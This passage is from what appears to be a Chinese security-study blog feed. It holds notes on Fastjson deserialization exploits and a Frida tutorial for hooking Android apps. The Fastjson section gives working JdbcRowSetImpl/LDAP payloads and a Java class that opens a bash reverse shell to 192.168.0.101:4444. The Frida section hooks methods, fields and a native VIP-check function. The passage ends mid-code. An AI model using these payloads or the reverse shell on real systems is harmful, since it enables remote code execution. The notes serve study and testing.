class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> &#x27;\r&#x27;<span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>fastjson不报错</p><p><strong>hutool.json</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>a<span class="hljs-punctuation">:</span>whatever<span class="hljs-punctuation">&#125;</span><span class="hljs-comment">/*\r\nxxx</span><br></code></pre></td></tr></table></figure><p>会产生报错</p><h5 id="Fastjson-1-2-24"><a href="#Fastjson-1-2-24" class="headerlink" title="Fastjson 1.2.24"></a>Fastjson 1.2.24</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:9999/Getshell&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><code>com.sun.rowset.JdbcRowSetImpl</code>利用链</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@type:</span> java类的完全限定名.<br><br><span class="hljs-variable">@dataSourceName</span>: 在 JdbcRowSetImpl 类中，这个属性用于指定数据库的 JDBC 连接字符串。<br><br><span class="hljs-attribute">autoCommit</span>: 这是 JdbcRowSetImpl 对象的一个属性，用于控制数据库事务是否自动提交。<br><br><span class="hljs-attribute">ldap</span>:<span class="hljs-comment">//localhost:9999/Exploit: 攻击者可以通过这种方式试图让应用程序连接到一个恶意的 LDAP 服务器，该服务器上配置了攻击者控制的恶意 Java 类。</span><br></code></pre></td></tr></table></figure><p>利用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.parseObject<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Getshell</span>&#123;<br><span class="hljs-keyword">static</span>&#123;<br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>String[] commands = &#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.101/4444 0&gt;&amp;1 &quot;</span>&#125;;<br><span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br>pc.waitFor();<br>&#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br><span class="hljs-comment">//do nothing</span><br>&#125;    <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Fastjson-1-2-47"><a href="#Fastjson-1-2-47" class="headerlink" title="Fastjson 1.2.47"></a><strong>Fastjson 1.2.47</strong></h5><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java">&#123;\<span class="hljs-string">&quot;a\&quot;: &#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot; &#125;, \&quot;b\&quot;: &#123; \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;: \&quot;ldap://127.0.0.1:1389/calc\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>frida抓包笔记</title>
    <link href="/2025/03/22/frida%E6%8A%93%E5%8C%85%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/03/22/frida%E6%8A%93%E5%8C%85%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="安卓Frida逆向与抓包实战笔记"><a href="#安卓Frida逆向与抓包实战笔记" class="headerlink" title="安卓Frida逆向与抓包实战笔记"></a>安卓Frida逆向与抓包实战笔记</h2><h5 id="Frida原理及重要组件"><a href="#Frida原理及重要组件" class="headerlink" title="Frida原理及重要组件"></a>Frida原理及重要组件</h5><hr><p>frida注入的原理就是找到目标进程，使用ptrace跟踪目标进程获取mmap在目标进程申请一段内存空间将在目标进程中找到存放frida-agent-32&#x2F;64.so的空间启动执行各种操作由agent去实现。</p><table><thead><tr><th>组件名称</th><th>功能描述</th></tr></thead><tbody><tr><td>frida-gum</td><td>提供了inline-hook的核心实现，包含代码跟踪模块Stalker，用于内存访问监控的MemoryAccessMonitor，以及符号查询、栈回溯实现、内存扫描、动态代码生成和重定位等功能。</td></tr><tr><td>frida-core</td><td>fridahook的核心、具有进程注入、进程间通信、会话管理、脚本生命周期管理等功能，屏蔽部分底层的实现细节并给最终用户提供开箱即用的操作接口。包含frida-server、frida-gadget、frida-agent、frida-helper、frida-inject等关键模块和组件，以及之间的互相通信底座。</td></tr><tr><td>frida-gadget</td><td>本身是一个动态库，可以通过重打包修改动态库的依赖或者修改smali代码去实现向三方应用注入gadget，从而实现frida的持久化或免root。</td></tr><tr><td>frida-server</td><td>本质上是一个二进制文件，类似于前面学习到的Android_server，需要在目标设备上运行并转发端口，在Frida hook中起到关键作用。</td></tr></tbody></table><p><strong>操作模式</strong></p><table><thead><tr><th>操作模式</th><th>描述</th><th>优点</th><th>主要用途</th></tr></thead><tbody><tr><td>CLI（命令行）模式</td><td>通过命令行直接将JavaScript脚本注入进程中，对进程进行操作</td><td>便于直接注入和操作</td><td>在较小规模的操作或者需求比较简单的场景中使用</td></tr><tr><td>RPC模式</td><td>使用python进行JavaScript脚本的注入工作，实际对进程进行操作的还是JavaScript脚本，可以通过RPC传输给python脚本来进行复杂数据处理</td><td>在对复杂数据的处理上可以通过RPC传输给Python脚本来进行，有利于减少被注入进程的性能损耗</td><td>在app已经启动，或者我们只关心特定时刻或者特定功能的行为时使用</td></tr></tbody></table><p>注入模式与启动命令</p><table><thead><tr><th>注入模式</th><th>描述</th><th>命令或参数</th><th>优点</th><th>主要用途</th></tr></thead><tbody><tr><td>Spawn模式</td><td>将启动App的权限交由Frida来控制，即使目标App已经启动，在使用Frida注入程序时还是会重新启动app</td><td>在CLI模式中，Frida通过加上 -f 参数指定包名以spawn模式操作app</td><td>适合于需要在app启动时即进行注入的场景，可以在APP启动时即捕获其行为</td><td>当需要监控app从启动开始的所以行为时使用</td></tr><tr><td>Attach模式</td><td>在目标app已经启动的情况下，frida通过ptrace注入程序从而执行Hook的操作</td><td>在CLI模式中，如果不添加 -f 参数，则默认会通过attach模式注入App</td><td>适合于已经运行的app，捕获重新启动app，对用户体验影响较小</td><td>在app已经启动，或者我们只关心特定时刻或特定功能的行为时使用</td></tr></tbody></table><p>Spawn模式</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">frida</span> -U -f 进程名 -l hook_java.js<br></code></pre></td></tr></table></figure><p>attach模式</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">frida</span> -U 进程名 -l hook_java.js<br></code></pre></td></tr></table></figure><p>基础语法</p><table><thead><tr><th>api名称</th><th>描述</th></tr></thead><tbody><tr><td>Java.use(className)</td><td>获取指定的java类并使其在javascript代码中可用</td></tr><tr><td>Java.perform(callback)</td><td>确保回调函数在Java的主线程上执行</td></tr><tr><td>Java.choose(className, callbacks)</td><td>枚举指定类的所有实例</td></tr><tr><td>Java.cast(obj, cls)</td><td>将一个Java对象转换成另一个Java类的实例</td></tr><tr><td>Java.enumerateLoadedClasses(callbacks)</td><td>枚举进程中存在的所以Java类。</td></tr><tr><td>Java.enumerateClassLoaders(callbacks)</td><td>枚举进程中存在的所以Java类加载器</td></tr><tr><td>Java.enumerateMethods(targetClassMethod)</td><td>枚举指定类的所有方法</td></tr></tbody></table><p>日志输出语法区别</p><table><thead><tr><th>日志方法</th><th>描述</th><th>区别</th></tr></thead><tbody><tr><td>console.log()</td><td>使用Javascript直接进行日志打印</td><td>多用于在CLI模式中，console.log()直接输出到命令行界面，使用户可以实时查看。在RPC模式中，console.log()同样输出在命令行，但啃被python脚本的输出内容掩盖。</td></tr><tr><td>send()</td><td>frida的专有方法，用于发送数据或日志到外部python脚本</td><td>多用于RPC模式中，它允许Javascript脚本发送数据到python脚本，python脚本可以进一步处理或记录这些数据。</td></tr></tbody></table><p><strong>Hook普通方法、打印参数和修改返回值</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//定义一个名为hookTest1的函数</span><br>function <span class="hljs-title function_">hookTest1</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-comment">//获取一个名为&quot;类名&quot;的Java类，并将其实例赋值给JavaScript变量utils</span><br>    <span class="hljs-type">var</span> <span class="hljs-variable">utils</span> <span class="hljs-operator">=</span> Java.use(<span class="hljs-string">&quot;类名&quot;</span>);<br>    <span class="hljs-comment">//修改&quot;类名&quot;的&quot;method&quot;方法的实现。这个新的实现会接收两个参数（a和b）</span><br>    utils.method.implementation = function(a, b)&#123;<br>    <span class="hljs-comment">//将参数a和b的值改为123和456。</span><br>        a = <span class="hljs-number">123</span>;<br>        b = <span class="hljs-number">456</span>;<br>        <span class="hljs-comment">//调用修改过的&quot;method&quot;方法，并将返回值存储在`retval`变量中</span><br>        <span class="hljs-type">var</span> <span class="hljs-variable">retval</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.method(a, b);<br>        <span class="hljs-comment">//在控制台上打印参数a，b的值以及&quot;method&quot;方法的返回值</span><br>        console.log(a, b, retval);<br>        <span class="hljs-comment">//返回&quot;method&quot;方法的返回值</span><br>        <span class="hljs-keyword">return</span> retval;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Hook重载参数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// .overload()</span><br><span class="hljs-comment">// .overload(&#x27;自定义参数&#x27;)</span><br><span class="hljs-comment">// .overload(&#x27;int&#x27;)</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest2</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> utils = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>);<br>    <span class="hljs-comment">//overload定义重载函数，根据函数的参数类型填</span><br>    utils.<span class="hljs-property">Inner</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;com.zj.wuaipojie.Demo$Animal&#x27;</span>,<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">a，b</span>)&#123;<br>        b = <span class="hljs-string">&quot;aaaaaaaaaa&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">Inner</span>(a,b);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Hook构造函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest3</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> utils = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>);<br>    <span class="hljs-comment">//修改类的构造函数的实现，$init表示构造函数</span><br>    utils.<span class="hljs-property">$init</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">str</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str);<br>        str = <span class="hljs-string">&quot;52&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.$init(str);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Hook字段</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest5</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-comment">//静态字段的修改</span><br>        <span class="hljs-keyword">var</span> utils = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>);<br>        <span class="hljs-comment">//修改类的静态字段&quot;flag&quot;的值</span><br>        utils.<span class="hljs-property">staticField</span>.<span class="hljs-property">value</span> = <span class="hljs-string">&quot;我是被修改的静态变量&quot;</span>;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(utils.<span class="hljs-property">staticField</span>.<span class="hljs-property">value</span>);<br>        <span class="hljs-comment">//非静态字段的修改</span><br>        <span class="hljs-comment">//使用`Java.choose()`枚举类的所有实例</span><br>        <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>, &#123;<br>            <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>)&#123;<br>            <span class="hljs-comment">//修改实例的非静态字段&quot;_privateInt&quot;的值为&quot;123456&quot;，并修改非静态字段&quot;privateInt&quot;的值为9999。</span><br>                obj.<span class="hljs-property">_privateInt</span>.<span class="hljs-property">value</span> = <span class="hljs-string">&quot;123456&quot;</span>; <span class="hljs-comment">//字段名与函数名相同 前面加个下划线</span><br>                obj.<span class="hljs-property">privateInt</span>.<span class="hljs-property">value</span> = <span class="hljs-number">9999</span>;<br>            &#125;,<br>            <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><br>            &#125;<br>        &#125;);<br>    &#125;);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>hook内部类</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest6</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-comment">//内部类</span><br>        <span class="hljs-keyword">var</span> innerClass = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo$innerClass&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(innerClass);<br>        innerClass.<span class="hljs-property">$init</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;eeeeeeee&quot;</span>);<br>        &#125;<br><br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>主动调用（静态方法）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest7</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>         <span class="hljs-keyword">var</span> <span class="hljs-title class_">ClassName</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>); <br>         <span class="hljs-keyword">var</span> ret = <span class="hljs-title class_">ClassName</span>.<span class="hljs-title function_">privateFunc</span>(<span class="hljs-string">&quot;zzzzzz&quot;</span>);<br>         <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret);<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>主动调用（非静态方法）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest8</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>      <span class="hljs-keyword">var</span> ret = <span class="hljs-literal">null</span>;<br>      <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>,&#123;    <span class="hljs-comment">//要hook的类</span><br>            <span class="hljs-attr">onMatch</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>)&#123;<br>                ret=instance.<span class="hljs-title function_">privateFunc</span>(<span class="hljs-string">&quot;aaaaaaa&quot;</span>); <span class="hljs-comment">//要hook的方法 privateFunc是可替代的方法，aaaaaa是参数</span><br>            &#125;,<br>            <span class="hljs-attr">onComplete</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-comment">//console.log(&quot;result: &quot; + ret);</span><br>            &#125;<br>        &#125;);<br>    &#125;)<br>    <span class="hljs-comment">//return ret;     </span><br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Frida-Native-Hook"><a href="#Frida-Native-Hook" class="headerlink" title="Frida-Native-Hook"></a>Frida-Native-Hook</h5><hr><p>Process、Module、Memory基础</p><p><strong>process</strong></p><p><code>Process</code> 对象代表当前被Hook的进程，能获取进程的信息，枚举模块，枚举范围等</p><table><thead><tr><th>API</th><th>含义</th></tr></thead><tbody><tr><td>process.id</td><td>返回附加目标进程的PID</td></tr><tr><td>process.isDebuggerAttached()</td><td>检测当前是否对目标程序已经附加</td></tr><tr><td>process.enumerateModuless()</td><td>枚举当前加载的模块，返回模块对象的数组</td></tr><tr><td>process.enumerateThreads()</td><td>枚举当前所有的线程，返回包含<code>id</code>，<code>state</code>，<code>context</code>等属性的对象数组</td></tr></tbody></table><p><strong>Module</strong></p><p><code>Module</code>对象代表一个加载到进程的模块（例如，在Windows上的DLL，或者Linux&#x2F;Android上的.so文件），能查询模块的信息，如模块的基地址、名称、导入\导出的函数等。</p><table><thead><tr><th>API</th><th>含义</th></tr></thead><tbody><tr><td>Module.load()</td><td>加载指定so文件，返回一个Module对象</td></tr><tr><td>enumerateImports()</td><td>枚举所有Import库函数，返回Module数组对象</td></tr><tr><td>enumerateExports()</td><td>枚举所有Export库函数，返回Module数组对象</td></tr><tr><td>enumerateSymbols()</td><td>枚举所有Symbol库函数，返回Module数组对象</td></tr><tr><td>Module.findExportByName(exportName)、Module.getExportByName(exportName)</td><td>寻找指定so中export库中的函数地址</td></tr><tr><td>Module.findBaseAddress(name)、Module.getBaseAddress(name)</td><td>返回so的基地址</td></tr></tbody></table><p><strong>Memory</strong></p><p><code>Memory</code>是一个工具对象，提供直接读取和修改进程内存的功能，能够读取特定地址的值、写入数据、分配内存等</p><table><thead><tr><th>方法</th><th>功能</th></tr></thead><tbody><tr><td><code>Memory.copy()</code></td><td>复制内存</td></tr><tr><td><code>Memory.scan()</code></td><td>搜索内存中特定模式的数据</td></tr><tr><td><code>Memory.scanSync()</code></td><td>同上，但返回多个匹配的数据</td></tr><tr><td><code>Memory.alloc()</code></td><td>在目标进程的堆上申请指定大小的内存，返回一个<code>NativePointer</code></td></tr><tr><td><code>Memory.writeByteArray()</code></td><td>将字节数组写入一个指定内存</td></tr><tr><td><code>Memory.readByteArray</code></td><td>读取内存</td></tr></tbody></table><p><strong>枚举导入导出表</strong></p><p><strong>导出表（Export Table）</strong>：列出了库中可以被其他程序或库访问的所有公开函数和符号的名称。</p><p><strong>导入表（Import Table）</strong>：列出了库需要从其他库中调用的函数和符号的名称。</p><p>简而言之，导出表告诉其他程序：“这些是我提供的功能。”，而导入表则表示：“这些是我需要的功能。”。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest1</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-comment">//打印导入表</span><br>        <span class="hljs-keyword">var</span> imports = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateImports</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i =<span class="hljs-number">0</span>; i &lt; imports.<span class="hljs-property">length</span>;i++)&#123;<br>            <span class="hljs-keyword">if</span>(imports[i].<span class="hljs-property">name</span> == <span class="hljs-string">&quot;vip&quot;</span>)&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(imports[i])); <span class="hljs-comment">//通过JSON.stringify打印object数据</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(imports[i].<span class="hljs-property">address</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//打印导出表</span><br>        <span class="hljs-keyword">var</span> <span class="hljs-built_in">exports</span> = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateExports</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i =<span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">exports</span>.<span class="hljs-property">length</span>;i++)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-built_in">exports</span>[i]));<br>        &#125;<br>        <br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Native函数的基础Hook打印</strong></p><ul><li>整数型、布尔值类型、char类型</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest2</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-comment">//根据导出函数名打印地址</span><br>        <span class="hljs-keyword">var</span> helloAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>,<span class="hljs-string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_checkVip&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(helloAddr); <br>        <span class="hljs-keyword">if</span>(helloAddr != <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-comment">//Interceptor.attach是Frida里的一个拦截器</span><br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(helloAddr,&#123;<br>            <span class="hljs-comment">//onEnter里可以打印和修改参数</span><br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;  <span class="hljs-comment">//args传入参数</span><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(args[<span class="hljs-number">0</span>]);  <span class="hljs-comment">//打印第一个参数的值</span><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">x1</span>);  <span class="hljs-comment">// 打印寄存器内容</span><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(args[<span class="hljs-number">1</span>].<span class="hljs-title function_">toInt32</span>()); <span class="hljs-comment">//toInt32()转十进制</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(args[<span class="hljs-number">2</span>].<span class="hljs-title function_">readCString</span>()); <span class="hljs-comment">//读取字符串 char类型</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(args[<span class="hljs-number">2</span>])); <span class="hljs-comment">//内存dump</span><br><br>                &#125;,<br>                <span class="hljs-comment">//onLeave里可以打印和修改返回值</span><br>                <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;  <span class="hljs-comment">//retval返回值</span><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title 